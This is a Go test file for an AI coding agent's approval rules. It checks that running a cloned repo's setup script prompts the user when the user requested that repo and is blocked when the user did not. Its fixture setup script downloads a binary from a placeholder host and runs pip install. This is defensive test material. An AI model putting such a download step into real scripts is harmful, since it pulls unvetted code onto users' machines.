package main

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

const urSetupPy = "import subprocess, urllib.request\nurllib.request.urlretrieve('https://example.invalid/m.bin', 'm.bin')\nsubprocess.run(['pip', 'install', '-r', 'req.txt'])\n"

// urRepo makes <root>/video-forge, a git clone whose origin is url.
func urRepo(t *testing.T, root, url string) {
	t.Helper()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not installed")
	}
	d := filepath.Join(root, "video-forge", "scripts")
	if err := os.MkdirAll(d, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(d, "setup_environment.py"), []byte(urSetupPy), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, args := range [][]string{{"init", "-q"}, {"remote", "add", "origin", url}} {
		c := exec.Command("git", args...)
		c.Dir = filepath.Join(root, "video-forge")
		if out, err := c.CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v %s", args, err, out)
		}
	}
}

func TestUrSlug(t *testing.T) {
	for in, want := range map[string]string{
		"https://github.com/jazzautomations/video-forge":      "github.com/jazzautomations/video-forge",
		"https://github.com/JazzAutomations/video-forge.git\n": "github.com/jazzautomations/video-forge",
		"git@github.com:jazzautomations/video-forge.git":       "github.com/jazzautomations/video-forge",
		"https://example.com/x/y":                              "",
	} {
		if got := urSlug(in); got != want {
			t.Errorf("urSlug(%q) = %q, want %q", in, got, want)
		}
	}
}

// The user named the repo: its setup script is a question (even in yolo),
// not a dead end; denied here, so it must not run.
func TestUserRequestedRepoSetupAsks(t *testing.T) {
	run := fakeCall{ID: "b1", Name: "bash", Args: `{"command":"cd video-forge && python3 scripts/setup_environment.py --out .t"}`}
	h := newHarness(t, seq(fakeResp{Calls: []fakeCall{run}}, fakeResp{Text: "você negou o setup; parei"}), func(c *Config) { c.Mode = "yolo" })
	urRepo(t, h.root, "https://github.com/jazzautomations/video-forge.git")
	if err := h.run(t, "lê essa skill e cria um vídeo https://github.com/jazzautomations/video-forge"); err != nil {
		t.Fatal(err)
	}
	if len(h.ui.approvals) != 1 || !strings.Contains(h.ui.approvals[0].Reason, "repositório que você pediu (github.com/jazzautomations/video-forge)") {
		t.Fatalf("want one question naming the requested repo, got %+v", h.ui.approvals)
	}
	if res := h.fs.requests()[1].toolResults()["b1"]; strings.Contains(res, "hostile") {
		t.Errorf("a requested repo is not called hostile: %q", res)
	}
}

// A repo the user did not name keeps the hard block, with no question.
func TestUnrequestedRepoSetupStaysBlocked(t *testing.T) {
	run := fakeCall{ID: "b1", Name: "bash", Args: `{"command":"cd video-forge && python3 scripts/setup_environment.py --out .t"}`}
	h := newHarness(t, seq(fakeResp{Calls: []fakeCall{run}}, fakeResp{Text: "bloqueado"}), func(c *Config) { c.Mode = "yolo" })
	urRepo(t, h.root, "https://github.com/someone-else/video-forge.git")
	if err := h.run(t, "lê essa skill e cria um vídeo https://github.com/jazzautomations/video-forge"); err != nil {
		t.Fatal(err)
	}
	if len(h.ui.approvals) != 0 {
		t.Errorf("an unrequested repo must not turn into a question: %+v", h.ui.approvals)
	}
	res := h.fs.requests()[1].toolResults()["b1"]
	if !strings.Contains(res, "hostile") || !strings.Contains(res, "say so plainly") {
		t.Errorf("want the hard block with the honesty steer: %q", res)
	}
}
